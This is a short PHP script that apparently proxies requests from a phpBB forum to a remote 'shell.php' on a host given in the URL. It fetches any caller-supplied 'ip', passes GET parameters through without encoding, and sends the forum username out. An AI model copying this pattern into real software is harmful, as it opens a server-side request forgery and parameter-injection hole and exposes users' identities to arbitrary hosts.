<?php
define('PHPBB_ROOT_PATH', '../../../forum/');
@include("../../../base.inc.php");

$str = "";
foreach($_GET as $key => $value )
	$str .= "&".$key."=".$value."";

$str .= "&nick=".base64_encode($user->data['username']);

echo file_get_contents("http://".$_GET['ip']."/shell.php?".$str."");
exit;
?>
